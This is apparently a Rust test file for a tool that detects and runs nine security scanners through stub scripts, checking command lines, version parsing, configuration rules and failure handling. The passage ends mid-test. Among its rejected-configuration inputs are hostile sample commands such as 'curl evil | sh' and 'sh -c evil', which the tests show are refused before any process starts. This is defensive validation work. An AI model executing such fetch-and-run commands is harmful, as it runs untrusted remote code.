//! Tests for the scanner registry and the orchestrator ([S-665], [FR-SC-05],
//! [NFR-SE-08], [NFR-SE-02]).
//!
//! No real scanner runs here. Every scanner is a stub shell script in a
//! temporary directory that becomes the **only** entry of the search path, so
//! a scanner installed on this machine is never found. A stub records each
//! invocation's argv, answers its version command, and copies the scanner's
//! committed fixture SARIF (`tests/fixtures/sarif/`) to the output its template
//! names. The tests then assert the argv against a literal copy of each
//! template and parse every produced report through [S-663]'s parser.
//!
//! [S-665]: ../../../docs/planning/journal.md#s-665-a-registry-of-nine-scanners-detects-what-is-installed-and-runs-each-to-sarif
//! [S-663]: ../../../docs/planning/journal.md#s-663-sarif-findings-are-ingested-into-the-evidence-store-anchored-and-redacted
//! [FR-SC-05]: ../../../docs/specs/requirements/FR-SC-05.md
//! [NFR-SE-02]: ../../../docs/specs/requirements/NFR-SE-02.md
//! [NFR-SE-08]: ../../../docs/specs/requirements/NFR-SE-08.md

use std::ffi::OsString;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use tempfile::TempDir;

use super::registry::{parse_version, Fill, REGISTRY};
use super::{
    scanner, Detection, Orchestrator, Outcome, ScanReport, ScannerOutcome, Selection, OUTPUT_DIR,
    REQUIRES_BUILD,
};
use crate::config::{parse_config, parse_user_config, ConfigError, SECURITY_SCANNERS};
use crate::history::security::parse_report;

/// The version line each stub prints, in the shape the real scanner prints it,
/// and the version detection must read from it.
const VERSIONS: &[(&str, &str, &str)] = &[
    ("semgrep", "1.85.0", "1.85.0"),
    ("trivy", "Version: 0.74.0\nVulnerability DB:\n  Version: 2", "0.74.0"),
    ("gitleaks", "v8.18.4", "8.18.4"),
    ("osv-scanner", "osv-scanner version: 1.9.1\ncommit: 4a2b9c1", "1.9.1"),
    ("bandit", "bandit 1.7.10\n  python version = 3.12.4", "1.7.10"),
    ("gosec", "Version: 2.21.4\nGit tag: v2.21.4", "2.21.4"),
    ("checkov", "3.2.255", "3.2.255"),
    ("codeql", "2.19.3", "2.19.3"),
    ("dependency-check", "Dependency-Check Core version 10.0.4", "10.0.4"),
];

/// The flag after which each scanner's template places its output, and the
/// file a directory output must hold.
const OUTPUTS: &[(&str, &str, Option<&str>)] = &[
    ("semgrep", "--output", None),
    ("trivy", "--output", None),
    ("gitleaks", "--report-path", None),
    ("osv-scanner", "--output", None),
    ("bandit", "--output", None),
    ("gosec", "-out", None),
    ("checkov", "--output-file-path", Some("results_sarif.sarif")),
    ("codeql", "--output", None),
    ("dependency-check", "--out", Some("dependency-check-report.sarif")),
];

/// The fixture project: Python, Go, Terraform and a manifest.
const PROJECT: &[(&str, &str)] = &[
    ("app/db.py", "import sqlite3\n"),
    ("cmd/server/main.go", "package main\n\nfunc main() {}\n"),
    ("infra/main.tf", "resource \"aws_s3_bucket\" \"data\" {}\n"),
    ("requirements.txt", "Django==2.2.0\n"),
];

fn fixture(scanner: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures/sarif")
        .join(format!("{scanner}.sarif"))
}

fn lookup<'a>(table: &'a [(&str, &'a str, &'a str)], name: &str) -> (&'a str, &'a str) {
    let row = table.iter().find(|r| r.0 == name).expect("listed");
    (row.1, row.2)
}

/// A temporary world: a project root, a stub `bin/` that is the whole search
/// path, a record directory, and a user-level config directory.
struct World {
    _tmp: TempDir,
    root: PathBuf,
    bin: PathBuf,
    rec: PathBuf,
    user: PathBuf,
}

impl World {
    fn new(files: &[(&str, &str)]) -> Self {
        let tmp = TempDir::new().expect("temp root");
        let base = tmp.path().canonicalize().unwrap();
        let (root, bin, rec, user) = (
            base.join("project"),
            base.join("bin"),
            base.join("rec"),
            base.join("user"),
        );
        for dir in [&root, &bin, &rec, &user] {
            fs::create_dir_all(dir).unwrap();
        }
        for (path, body) in files {
            let full = root.join(path);
            fs::create_dir_all(full.parent().unwrap()).unwrap();
            fs::write(full, body).unwrap();
        }
        Self { _tmp: tmp, root, bin, rec, user }
    }

    /// Install a stub for `name` in `bin/` that exits `exit` after producing
    /// its fixture report.
    fn stub(&self, name: &str, exit: i32) {
        self.stub_at(&self.bin.join(name), name, name, exit, "");
    }

    /// Install a stub for scanner `name` at `path`, recording under `record`.
    /// `extra` is shell run just before the exit.
    fn stub_at(&self, path: &Path, name: &str, record: &str, exit: i32, extra: &str) {
        let (version, _) = lookup(VERSIONS, name);
        let row = OUTPUTS.iter().find(|r| r.0 == name).unwrap();
        let (flag, produced) = (row.1, row.2);
        let env = self.rec.join(format!("{record}.env"));
        let record = self.rec.join(format!("{record}.argv"));
        let copy = match produced {
            None => format!("/bin/cp '{}' \"$out\"", fixture(name).display()),
            Some(file) => format!(
                "/bin/mkdir -p \"$out\" && /bin/cp '{}' \"$out/{file}\"",
                fixture(name).display()
            ),
        };
        let script = format!(
            "#!/bin/sh\n\
             for a in \"$@\"; do printf '%s\\n' \"$a\"; done >> '{record}'\n\
             printf '%s\\n' '--end--' >> '{record}'\n\
             printf 'SEMGREP_ENABLE_VERSION_CHECK=%s TRIVY_SKIP_VERSION_CHECK=%s GOTOOLCHAIN=%s\\n' \
             \"$SEMGREP_ENABLE_VERSION_CHECK\" \"$TRIVY_SKIP_VERSION_CHECK\" \"$GOTOOLCHAIN\" >> '{env}'\n\
             printf 'cwd=%s\\npath=%s\\n' \"$(pwd -P)\" \"$PATH\" >> '{env}'\n\
             case \"$1\" in --version|version|-version) printf '%s\\n' '{version}'; exit 0;; esac\n\
             out=''; prev=''\n\
             for a in \"$@\"; do if [ \"$prev\" = '{flag}' ]; then out=\"$a\"; fi; prev=\"$a\"; done\n\
             if [ -n \"$out\" ]; then {copy}; fi\n\
             {extra}\n\
             exit {exit}\n",
            record = record.display(),
            env = env.display(),
        );
        write_executable(path, &script);
    }

    fn all_stubs(&self) {
        for s in &REGISTRY {
            self.stub(s.name, 0);
        }
    }

    fn search_path(&self) -> Option<OsString> {
        Some(self.bin.clone().into_os_string())
    }

    fn open(&self) -> Result<Orchestrator, ConfigError> {
        Orchestrator::open_with(&self.root, Some(&self.user), self.search_path())
    }

    fn scan(&self, selection: &Selection) -> ScanReport {
        self.open().expect("config loads").scan(selection).expect("scan runs")
    }

    fn repo_config(&self, text: &str) {
        let dir = self.root.join(".logos");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("config.toml"), text).unwrap();
    }

    fn user_config(&self, text: &str) {
        fs::write(self.user.join("config.toml"), text).unwrap();
    }

    /// Every recorded invocation of `name`, oldest first.
    fn invocations(&self, name: &str) -> Vec<Vec<String>> {
        let Ok(text) = fs::read_to_string(self.rec.join(format!("{name}.argv"))) else {
            return Vec::new();
        };
        let mut calls = Vec::new();
        let mut current = Vec::new();
        for line in text.lines() {
            if line == "--end--" {
                calls.push(std::mem::take(&mut current));
            } else {
                current.push(line.to_string());
            }
        }
        calls
    }

    /// Every invocation of `name` other than its version probe.
    fn runs(&self, name: &str) -> Vec<Vec<String>> {
        let probe: Vec<String> = scanner(name)
            .unwrap()
            .version_args
            .iter()
            .map(|s| (*s).to_string())
            .collect();
        self.invocations(name).into_iter().filter(|c| *c != probe).collect()
    }

    fn out(&self, file: &str) -> String {
        self.root.join(OUTPUT_DIR).join(file).display().to_string()
    }
}

fn write_executable(path: &Path, body: &str) {
    fs::write(path, body).unwrap();
    fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
}

fn outcome<'a>(report: &'a ScanReport, name: &str) -> &'a ScannerOutcome {
    report
        .outcomes
        .iter()
        .find(|o| o.scanner == name)
        .unwrap_or_else(|| panic!("{name} has an outcome"))
}

fn strings(items: &[&str]) -> Vec<String> {
    items.iter().map(|s| (*s).to_string()).collect()
}

/// The argv each template must produce on a full scan, written out by hand —
/// the second spelling that pins the registry's.
fn expected_runs(w: &World) -> Vec<(&'static str, Vec<Vec<String>>)> {
    let dir = |name: &str| w.root.join(OUTPUT_DIR).join(name).display().to_string();
    vec![
        (
            "semgrep",
            vec![strings(&[
                "scan", "--config", "p/default", "--sarif", "--output", &w.out("semgrep.sarif"),
                "--metrics", "off", "--disable-version-check", "--quiet", "--exclude", ".logos", ".",
            ])],
        ),
        (
            "trivy",
            vec![strings(&[
                "fs", "--scanners", "vuln,secret,misconfig", "--format", "sarif", "--output",
                &w.out("trivy.sarif"), "--skip-dirs", ".logos", "--config", &w.out("empty-config.yaml"), ".",
            ])],
        ),
        (
            "gitleaks",
            vec![strings(&[
                "detect", "--redact", "--no-banner", "--exit-code", "0", "--report-format", "sarif",
                "--report-path", &w.out("gitleaks.sarif"), "--source", ".",
            ])],
        ),
        (
            "osv-scanner",
            vec![strings(&[
                "--format", "sarif", "--output", &w.out("osv-scanner.sarif"), "--recursive", ".",
            ])],
        ),
        (
            "bandit",
            vec![strings(&[
                "--recursive", "--format", "sarif", "--output", &w.out("bandit.sarif"),
                "--exit-zero", "--quiet", "--exclude", "./.logos", ".",
            ])],
        ),
        (
            "gosec",
            vec![strings(&["-fmt", "sarif", "-out", &w.out("gosec.sarif"), "-no-fail", "-quiet", "./..."])],
        ),
        (
            "checkov",
            vec![strings(&[
                "--output", "sarif", "--output-file-path", &dir("checkov"), "--soft-fail", "--quiet",
                "--skip-path", ".logos", "--directory", ".",
            ])],
        ),
        (
            "codeql",
            vec![
                strings(&[
                    "database", "create", &dir("codeql/python"), "--language=python",
                    "--build-mode=none", "--source-root=.", "--overwrite",
                ]),
                strings(&[
                    "database", "analyze", &dir("codeql/python"), "--format=sarif-latest", "--output",
                    &w.out("codeql/python.sarif"),
                ]),
            ],
        ),
        (
            "dependency-check",
            vec![strings(&[
                "--scan", ".", "--format", "SARIF", "--out", &dir("dependency-check"), "--exclude",
                "**/.logos/**", "--disableYarnAudit", "--disablePnpmAudit", "--disableBundleAudit",
                "--disableGolangMod", "--disableMixAudit",
            ])],
        ),
    ]
}

#[test]
fn the_registry_holds_the_nine_configured_scanners_in_order() {
    let names: Vec<&str> = REGISTRY.iter().map(|s| s.name).collect();
    assert_eq!(names, SECURITY_SCANNERS);
    // Every scanner names the driver its SARIF carries, which the ingest stores.
    for s in &REGISTRY {
        let text = fs::read_to_string(fixture(s.name)).unwrap();
        let (_, runs) = parse_report(&text).unwrap();
        assert_eq!(runs[0].scanner_name, s.driver, "{}'s fixture driver", s.name);
    }
}

#[test]
fn detection_reports_each_scanner_installed_with_its_version_or_not_installed() {
    let w = World::new(PROJECT);
    let installed = ["semgrep", "trivy", "gitleaks", "osv-scanner", "bandit", "gosec", "dependency-check"];
    for name in installed {
        w.stub(name, 0);
    }
    let states = w.open().unwrap().detect();
    assert_eq!(
        states.iter().map(|s| s.scanner).collect::<Vec<_>>(),
        SECURITY_SCANNERS,
        "one state per registered scanner, in order"
    );
    for state in &states {
        if installed.contains(&state.scanner) {
            let (_, version) = lookup(VERSIONS, state.scanner);
            assert_eq!(
                state.detection,
                Detection::Installed {
                    binary: w.bin.join(state.scanner),
                    version: Some(version.to_string()),
                },
                "{} is installed with its version",
                state.scanner
            );
            // The probe is the version command and nothing else.
            let probe = strings(scanner(state.scanner).unwrap().version_args);
            assert_eq!(w.invocations(state.scanner), vec![probe], "{}'s probe", state.scanner);
        } else {
            assert_eq!(state.detection, Detection::NotInstalled, "{}", state.scanner);
        }
    }
    // The update-check opt-outs ride on the probe itself.
    let env = |name: &str| fs::read_to_string(w.rec.join(format!("{name}.env"))).unwrap();
    assert!(env("semgrep").contains("SEMGREP_ENABLE_VERSION_CHECK=0 "), "{}", env("semgrep"));
    assert!(env("trivy").contains("TRIVY_SKIP_VERSION_CHECK=true"), "{}", env("trivy"));
    assert!(env("gosec").contains("GOTOOLCHAIN=local"), "{}", env("gosec"));
}

#[test]
fn every_template_runs_its_fixed_argv_and_its_output_parses_through_the_ingest_parser() {
    let w = World::new(PROJECT);
    w.all_stubs();
    let report = w.scan(&Selection::All);
    assert_eq!(report.outcomes.len(), 9);
    for (name, expected) in expected_runs(&w) {
        assert_eq!(w.runs(name), expected, "{name}'s argv is its template");
        let o = outcome(&report, name);
        let (_, version) = lookup(VERSIONS, name);
        assert_eq!(o.version.as_deref(), Some(version), "{name}'s version");
        let Outcome::Ran { sarif, requires_build } = &o.outcome else {
            panic!("{name} ran: {:?}", o.outcome);
        };
        let expected_build: Vec<String> = if name == "codeql" { strings(&["go"]) } else { Vec::new() };
        assert_eq!(*requires_build, expected_build, "{name}'s skipped languages");
        assert_eq!(sarif.len(), 1, "{name} wrote one report");
        assert!(sarif[0].starts_with(w.root.join(OUTPUT_DIR)), "{name} writes under .logos/security");
        let text = fs::read_to_string(&sarif[0]).unwrap();
        let (_, runs) = parse_report(&text).unwrap_or_else(|e| panic!("{name}'s output parses: {e:#}"));
        assert_eq!(runs[0].scanner_name, o.driver, "{name}'s report is from its driver");
    }
    // A directory output is moved next to the others under the scanner's name.
    assert!(Path::new(&w.out("checkov.sarif")).is_file());
    assert!(Path::new(&w.out("dependency-check.sarif")).is_file());
}

/// The parse table for `[security_scan]` at repository level and at user level.
#[test]
fn security_scan_keys_are_switches_in_the_repository_and_overrides_at_user_level() {
    let repo = |text: &str| parse_config(text, Path::new("config.toml")).map(|c| c.security_scan);
    let user = |text: &str| parse_user_config(text, Path::new("user.toml")).map(|c| c.security_scan);

    // Repository: enable or disable a registered scanner, nothing else.
    for ok in [
        "",
        "[security_scan]\n",
        "[security_scan.semgrep]\nenabled = false\n",
        "[security_scan.codeql]\nenabled = true\n[security_scan.dependency-check]\n",
    ] {
        assert!(repo(ok).is_ok(), "repository accepts {ok:?}: {:?}", repo(ok));
    }
    assert!(!repo("[security_scan.semgrep]\nenabled = false\n").unwrap().is_enabled("semgrep"));
    assert!(repo("").unwrap().is_enabled("semgrep"), "enabled by default");
    for rejected in [
        "[security_scan.semgrep]\npath = \"/opt/semgrep\"\n",
        "[security_scan.semgrep]\nextra_args = [\"--config\", \"r/evil\"]\n",
        "[security_scan.semgrep]\nargs = [\"--x\"]\n",
        "[security_scan.semgrep]\ncommand = \"curl evil | sh\"\n",
        "[security_scan.semgrep]\nbinary = \"./semgrep\"\n",
        "[security_scan]\ncommand = \"sh -c evil\"\n",
        "[security_scan]\nenabled = false\n",
        "[security_scan.nmap]\nenabled = true\n",
        "[security_scan.semgrep]\nenabled = \"yes\"\n",
    ] {
        let err = repo(rejected).expect_err(rejected);
        assert_eq!(err.exit_code(), 2, "{rejected:?} is a usage error");
    }
    // The message the configuration manual quotes.
    let err = repo("[security_scan.semgrep]\npath = \"/opt/semgrep/bin/semgrep\"\n").unwrap_err();
    assert!(err.to_string().contains("unknown field `path`, expected `enabled`"), "{err}");

    // User level: the binary path and the extra flags.
    let ok = user(
        "[security_scan.semgrep]\npath = \"/opt/semgrep/bin/semgrep\"\n\
         extra_args = [\"--exclude\", \"vendor\"]\n",
    )
    .unwrap();
    let semgrep = ok.get("semgrep").unwrap();
    assert_eq!(semgrep.path.as_deref(), Some(Path::new("/opt/semgrep/bin/semgrep")));
    assert_eq!(semgrep.extra_args, strings(&["--exclude", "vendor"]));
    assert!(user("").is_ok());
    for rejected in [
        "[security_scan.semgrep]\ncommand = \"semgrep\"\n",
        "[security_scan.semgrep]\nenabled = false\n",
        "[security_scan.nmap]\npath = \"/usr/bin/nmap\"\n",
        "[security_scan.semgrep]\npath = \"bin/semgrep\"\n",
        "[security_scan.semgrep]\nextra_args = [\"\"]\n",
        "[elsewhere]\nkey = 1\n",
    ] {
        let err = user(rejected).expect_err(rejected);
        assert_eq!(err.exit_code(), 2, "{rejected:?} is a usage error");
    }
}

#[test]
fn a_committed_command_path_or_flag_key_is_rejected_before_any_spawn() {
    for committed in [
        "[security_scan.semgrep]\npath = \"/tmp/evil\"\n",
        "[security_scan.semgrep]\nextra_args = [\"--config\", \"r/evil\"]\n",
        "[security_scan]\ncommand = \"sh -c evil\"\n",
    ] {
        let w = World::new(PROJECT);
        w.all_stubs();
        w.repo_config(committed);
        let err = w.open().expect_err(committed);
        assert_eq!(err.exit_code(), 2);
        assert!(
            fs::read_dir(&w.rec).unwrap().next().is_none(),
            "{committed:?}: nothing was spawned"
        );
    }
}

#[test]
fn the_same_keys_at_user_level_take_effect() {
    let w = World::new(PROJECT);
    w.all_stubs();
    // A second semgrep, outside the search path, chosen by the user.
    let custom_dir = w.user.join("tools");
    fs::create_dir_all(&custom_dir).unwrap();
    let custom = custom_dir.join("semgrep-pinned");
    w.stub_at(&custom, "semgrep", "semgrep-pinned", 0, "");
    w.user_config(&format!(
        "[security_scan.semgrep]\npath = \"{}\"\nextra_args = [\"--exclude\", \"vendor\"]\n\
         [security_scan.codeql]\nextra_args = [\"--threads=2\"]\n\
         [security_scan.gosec]\nextra_args = [\"-exclude=G104\"]\n",
        custom.display()
    ));
    let report = w.scan(&Selection::Only(strings(&["semgrep", "codeql", "gosec"])));
    assert_eq!(report.outcomes.len(), 3);

    let semgrep = outcome(&report, "semgrep");
    assert!(matches!(semgrep.outcome, Outcome::Ran { .. }), "{semgrep:?}");
    // Only the user's binary ran — the copy on the search path never did — and
    // the run carries the extra flags at the template's extra position, before
    // the path position.
    assert!(w.invocations("semgrep").is_empty(), "the search-path semgrep never ran");
    let pinned: Vec<Vec<String>> = w
        .invocations("semgrep-pinned")
        .into_iter()
        .filter(|c| *c != strings(&["--version"]))
        .collect();
    assert_eq!(
        pinned,
        vec![strings(&[
            "scan", "--config", "p/default", "--sarif", "--output", &w.out("semgrep.sarif"),
            "--metrics", "off", "--disable-version-check", "--quiet", "--exclude", ".logos",
            "--exclude", "vendor", ".",
        ])]
    );
    assert_eq!(w.invocations("semgrep-pinned").len(), 2, "probe + run of the user's binary");
    // gosec stops reading flags at its first positional: the extras precede it.
    assert_eq!(
        w.runs("gosec"),
        vec![strings(&[
            "-fmt", "sarif", "-out", &w.out("gosec.sarif"), "-no-fail", "-quiet", "-exclude=G104", "./...",
        ])]
    );
    // CodeQL's extras go to the analysis, never to database creation.
    let codeql = w.runs("codeql");
    assert_eq!(codeql.len(), 2);
    assert!(!codeql[0].contains(&"--threads=2".to_string()), "{:?}", codeql[0]);
    assert_eq!(codeql[1].last().map(String::as_str), Some("--threads=2"));
}

#[test]
fn a_user_path_that_does_not_exist_is_not_installed_rather_than_a_path_lookup() {
    let w = World::new(PROJECT);
    w.all_stubs();
    w.user_config("[security_scan.semgrep]\npath = \"/nonexistent/semgrep\"\n");
    let states = w.open().unwrap().detect();
    assert_eq!(states[0].scanner, "semgrep");
    assert_eq!(states[0].detection, Detection::NotInstalled);
    assert!(w.invocations("semgrep").is_empty(), "the PATH copy is not used instead");
}

#[test]
fn codeql_on_build_requiring_languages_is_skipped_with_the_reason_and_no_build_is_spawned() {
    let w = World::new(&[
        ("cmd/server/main.go", "package main\n"),
        ("android/App.kt", "fun main() {}\n"),
        ("ios/App.swift", "print(1)\n"),
        ("native/lib.c", "int f(void) { return 0; }\n"),
        ("README.md", "# fixture\n"),
    ]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert_eq!(
        outcome(&report, "codeql").outcome,
        Outcome::RequiresBuild {
            languages: strings(&["c-cpp", "go", "kotlin", "swift"]),
            reason: REQUIRES_BUILD,
        }
    );
    assert_eq!(REQUIRES_BUILD, "requires a build — ingest a CI report");
    // The version probe is the only process CodeQL was started for.
    assert_eq!(w.invocations("codeql"), vec![strings(&["version", "--format=terse"])]);
    assert!(!w.root.join(OUTPUT_DIR).join("codeql").exists(), "no database was created");
}

/// Java's `none` mode still resolves dependencies through the project's own
/// Maven or Gradle build, so a Java project is reported as needing a build and
/// nothing — no CodeQL step, no `gradlew` — is started ([NFR-SE-02]).
///
/// [NFR-SE-02]: ../../../docs/specs/requirements/NFR-SE-02.md
#[test]
fn codeql_on_a_java_only_project_is_skipped_and_its_build_is_never_run() {
    let w = World::new(&[("src/main/java/App.java", "class App {}\n"), ("build.gradle", "")]);
    let marker = w.user.join("gradlew-ran");
    write_executable(&w.root.join("gradlew"), &format!("#!/bin/sh\n: > '{}'\n", marker.display()));
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert_eq!(
        outcome(&report, "codeql").outcome,
        Outcome::RequiresBuild { languages: strings(&["java"]), reason: REQUIRES_BUILD }
    );
    assert_eq!(w.invocations("codeql"), vec![strings(&["version", "--format=terse"])]);
    assert!(!marker.exists(), "the project's build was never run");
}

/// Every source-only language present runs, each with its own database and
/// report, in registry order, with `--build-mode=none` and no other mode.
#[test]
fn codeql_runs_each_source_only_language_with_build_mode_none() {
    let w = World::new(&[("web/app.ts", "export {}\n"), ("app/db.py", ""), ("lib/x.rb", "")]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    let Outcome::Ran { sarif, requires_build } = &outcome(&report, "codeql").outcome else {
        panic!("{report:?}");
    };
    let labels = ["javascript-typescript", "python", "ruby"];
    // One report for the whole project, so its languages ingest as one snapshot
    // (a snapshot is keyed by HEAD and scanner: per-language reports ingested
    // one by one would each replace the last). Each language's runs are in it.
    assert_eq!(*sarif, vec![PathBuf::from(w.out("codeql.sarif"))]);
    let (_, runs) = parse_report(&fs::read_to_string(&sarif[0]).unwrap()).unwrap();
    assert_eq!(runs.len(), labels.len(), "one run per language, merged");
    for label in labels {
        assert!(Path::new(&w.out(&format!("codeql/{label}.sarif"))).is_file(), "{label}'s own report");
        assert!(!Path::new(&w.out(&format!("codeql-{label}.sarif"))).exists(), "no per-language report the watcher would admit");
    }
    assert!(requires_build.is_empty());
    let runs = w.runs("codeql");
    assert_eq!(runs.len(), 6, "create + analyze per language: {runs:?}");
    for (i, label) in labels.iter().enumerate() {
        let (create, analyze) = (&runs[2 * i], &runs[2 * i + 1]);
        assert_eq!(create[..2], strings(&["database", "create"]));
        assert!(create.contains(&format!("--language={label}")), "{create:?}");
        assert_eq!(create.iter().filter(|a| a.starts_with("--build-mode")).collect::<Vec<_>>(), ["--build-mode=none"]);
        assert_eq!(analyze[..2], strings(&["database", "analyze"]));
        assert!(!analyze.iter().any(|a| a.starts_with("--build-mode")), "{analyze:?}");
    }
}

/// A failed database creation stops CodeQL with that step's exit code and
/// stderr; the analysis is never started.
#[test]
fn a_failed_codeql_database_creation_is_its_failure() {
    let w = World::new(&[("app/db.py", "")]);
    let record = w.rec.join("codeql.argv");
    write_executable(
        &w.bin.join("codeql"),
        &format!(
            "#!/bin/sh\nprintf '%s\\n' \"$*\" >> '{}'\n\
             case \"$1\" in version) printf '2.19.3\\n'; exit 0;; esac\n\
             printf 'extractor crashed\\n' >&2\nexit 2\n",
            record.display()
        ),
    );
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert_eq!(
        outcome(&report, "codeql").outcome,
        Outcome::Failed { exit_code: Some(2), stderr: "extractor crashed".to_string() }
    );
    let calls = fs::read_to_string(&record).unwrap();
    assert!(!calls.contains("database analyze"), "{calls}");
}

#[test]
fn codeql_with_no_language_it_analyses_is_not_applicable() {
    let w = World::new(&[("infra/main.tf", "")]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert!(
        matches!(outcome(&report, "codeql").outcome, Outcome::NotApplicable { .. }),
        "{report:?}"
    );
    assert_eq!(w.runs("codeql"), Vec::<Vec<String>>::new());
}

#[test]
fn a_disabled_scanner_is_neither_probed_nor_run() {
    let w = World::new(PROJECT);
    w.all_stubs();
    w.repo_config("[security_scan.trivy]\nenabled = false\n");
    let orchestrator = w.open().unwrap();
    assert_eq!(orchestrator.detect()[1].detection, Detection::Disabled);
    let report = orchestrator.scan(&Selection::Only(strings(&["trivy", "gitleaks"]))).unwrap();
    assert_eq!(outcome(&report, "trivy").outcome, Outcome::Disabled);
    assert!(matches!(outcome(&report, "gitleaks").outcome, Outcome::Ran { .. }));
    assert!(w.invocations("trivy").is_empty(), "a disabled scanner is never spawned");
}

#[test]
fn a_failing_scanner_reports_its_stderr_and_never_stops_the_others() {
    let w = World::new(PROJECT);
    w.all_stubs();
    // Semgrep fails; gitleaks exits 0 without writing; osv-scanner's 1 means
    // "vulnerabilities found".
    w.stub_at(&w.bin.join("semgrep"), "semgrep", "semgrep", 7, "printf 'rule fetch failed\\n' >&2");
    write_executable(
        &w.bin.join("gitleaks"),
        "#!/bin/sh\ncase \"$1\" in version) printf 'v8.18.4\\n';; esac\nexit 0\n",
    );
    w.stub("osv-scanner", 1);
    // A stale report from an earlier run is never credited to this one.
    fs::create_dir_all(w.root.join(OUTPUT_DIR)).unwrap();
    fs::copy(fixture("gitleaks"), w.out("gitleaks.sarif")).unwrap();

    let report = w.scan(&Selection::All);
    assert_eq!(
        outcome(&report, "semgrep").outcome,
        Outcome::Failed { exit_code: Some(7), stderr: "rule fetch failed".to_string() }
    );
    let Outcome::Failed { exit_code, stderr } = &outcome(&report, "gitleaks").outcome else {
        panic!("{report:?}");
    };
    assert_eq!(*exit_code, Some(0));
    assert!(stderr.contains("wrote no SARIF"), "{stderr}");
    assert!(!Path::new(&w.out("gitleaks.sarif")).exists(), "the stale report was cleared");
    assert!(matches!(outcome(&report, "osv-scanner").outcome, Outcome::Ran { .. }));
    for name in ["trivy", "bandit", "gosec", "checkov", "codeql", "dependency-check"] {
        assert!(matches!(outcome(&report, name).outcome, Outcome::Ran { .. }), "{name} still ran");
    }
}

#[test]
fn captured_output_is_bounded_and_a_flooding_scanner_never_blocks() {
    let w = World::new(PROJECT);
    // 1 MiB on each stream, then a failure.
    let flood = "/bin/dd if=/dev/zero bs=1024 count=1024 2>/dev/null | /usr/bin/tr '\\0' 'x'";
    write_executable(
        &w.bin.join("bandit"),
        &format!(
            "#!/bin/sh\ncase \"$1\" in --version) printf 'bandit 1.7.10\\n'; exit 0;; esac\n\
             {flood}\n{flood} >&2\nprintf 'END' >&2\nexit 3\n"
        ),
    );
    let report = w.scan(&Selection::Only(strings(&["bandit"])));
    let Outcome::Failed { exit_code, stderr } = &outcome(&report, "bandit").outcome else {
        panic!("{report:?}");
    };
    assert_eq!(*exit_code, Some(3));
    assert!(stderr.len() <= super::spawn::STDERR_CAP, "{} bytes kept", stderr.len());
    assert!(stderr.ends_with("END"), "the tail is kept");
}

#[test]
fn a_relative_search_path_entry_never_resolves_a_binary() {
    let w = World::new(PROJECT);
    w.stub("semgrep", 0);
    // The same stub directory, spelled relative to this process's directory.
    let cwd = std::env::current_dir().unwrap();
    let up = "../".repeat(cwd.components().count() - 1);
    let relative = format!("{up}{}", w.bin.strip_prefix("/").unwrap().display());
    assert!(Path::new(&relative).join("semgrep").is_file(), "the relative entry does name the stub");
    let orchestrator =
        Orchestrator::open_with(&w.root, Some(&w.user), Some(OsString::from(relative))).unwrap();
    assert_eq!(orchestrator.detect()[0].detection, Detection::NotInstalled);
    assert!(w.invocations("semgrep").is_empty());
}

#[test]
fn an_unknown_scanner_in_a_selection_is_rejected_before_any_spawn() {
    let w = World::new(PROJECT);
    w.all_stubs();
    let err = w
        .open()
        .unwrap()
        .scan(&Selection::Only(strings(&["semgrep", "nmap"])))
        .expect_err("nmap is not registered");
    let config = err.downcast_ref::<ConfigError>().expect("a usage error");
    assert_eq!(config.exit_code(), 2);
    assert!(fs::read_dir(&w.rec).unwrap().next().is_none(), "nothing was spawned");
}

/// The path position is fixed: a scoped run's argv differs from the full
/// run's only there ([FR-SC-17]); the whole-manifest scanners have none.
///
/// [FR-SC-17]: ../../../docs/specs/requirements/FR-SC-17.md
#[test]
fn a_scoped_argv_differs_from_the_full_argv_only_at_the_path_position() {
    let out = Path::new("/r/.logos/security/x.sarif");
    let extra = strings(&["--flag"]);
    let scope = strings(&["src/a.py", "src/b.py"]);
    let path_capable: Vec<&str> = REGISTRY
        .iter()
        .filter(|s| s.path_slot.is_some())
        .map(|s| s.name)
        .collect();
    assert_eq!(path_capable, ["semgrep", "gitleaks", "bandit", "gosec", "checkov"]);
    for s in &REGISTRY {
        let fill = Fill {
            out,
            extra: &extra,
            scope: None,
            language: "python",
            database: Path::new("/db"),
            pinned_config: Path::new("/r/.logos/security/empty-config.yaml"),
        };
        let full = s.render(s.run, &fill);
        let scoped = s.render(s.run, &Fill { scope: Some(&scope), ..fill });
        let Some(slot) = s.path_slot else {
            assert!(!s.run.contains(&super::registry::Arg::Paths), "{} has no path position", s.name);
            assert_eq!(full, scoped, "{} ignores a scope", s.name);
            continue;
        };
        let at = s.run.iter().position(|a| *a == super::registry::Arg::Paths).unwrap() + extra.len() - 1;
        let tail = full.len() - at - slot.full.len();
        assert_eq!(full[..at], scoped[..at], "{}: the prefix is unchanged", s.name);
        assert_eq!(full[full.len() - tail..], scoped[scoped.len() - tail..], "{}: the suffix is unchanged", s.name);
        let paths: Vec<OsString> = scoped[at..scoped.len() - tail].to_vec();
        let mut want = Vec::new();
        for p in &scope {
            want.extend(slot.per_path_flag.map(OsString::from));
            want.push(OsString::from(p));
        }
        assert_eq!(paths, want, "{}: the path position holds the scope", s.name);
    }
}

#[test]
fn the_version_is_the_first_version_shaped_token() {
    for (_, printed, want) in VERSIONS {
        assert_eq!(parse_version(printed).as_deref(), Some(*want), "{printed:?}");
    }
    assert_eq!(parse_version("no version here"), None);
    assert_eq!(parse_version("build 7"), None, "a lone integer is not a version");
}

/// A repository config that names code for the scanner to run stops that
/// scanner before it starts; the others run ([NFR-SE-02]).
///
/// [NFR-SE-02]: ../../../docs/specs/requirements/NFR-SE-02.md
#[test]
fn a_repository_scanner_config_that_can_name_code_to_run_refuses_that_scanner() {
    for file in [".checkov.yaml", ".checkov.yml"] {
        let w = World::new(PROJECT);
        w.all_stubs();
        fs::write(w.root.join(file), "external-checks-dir:\n  - checks\n").unwrap();
        let report = w.scan(&Selection::Only(strings(&["checkov", "bandit"])));
